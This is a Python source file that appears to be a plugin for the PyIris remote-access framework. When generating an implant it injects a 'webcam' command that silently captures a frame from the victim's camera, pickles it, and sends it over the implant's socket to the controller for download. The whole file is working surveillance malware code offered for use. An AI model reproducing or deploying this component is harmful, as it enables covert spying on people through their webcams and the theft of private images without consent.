# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('import cv2')
        self.config.import_statements.append('from PIL import Image')
        self.config.import_statements.append('from io import BytesIO')
        self.config.import_statements.append('import pickle')
        self.config.functions.append('''
def webcam():
    cam = cv2.VideoCapture(0)
    retval, im = cam.read()
    cam.release()
    cv2.destroyAllWindows()
    im = cv2.cvtColor(im, cv2.COLOR_BGR2RGB)
    return im''')
        self.config.logics.append('''
            elif command == 'webcam':
                send_all(s,pickle.dumps(Image.fromarray(webcam())))''')
        self.config.help_menu[
            'webcam'] = 'Snaps a picture from the webcam and saves it as an in memory pickle before sending it to PyIris to decode and download'
    elif option == 'info':
        self.log.blank('\nName             : In-memory webcam component' \
                       '\nOS               : Linux' \
                       '\nRequired Modules : PIL (external), cv2 (external), io, pickle' \
                       '\nCommands         : webcam' \
                       '\nDescription      : Snaps a picture from the webcam and saves it as an in memory pickle before sending it to PyIris to decode and download\n')
        return {
                "Name": "In-memory webcam component",
                "OS": "Linux",
                "Required Modules": "PIL (external), cv2 (external), io, pickle",
                "Commands": "webcam",
                "Description": "Snaps a picture from the webcam and saves it as an in memory pickle before sending it to PyIris to decode and download"
            }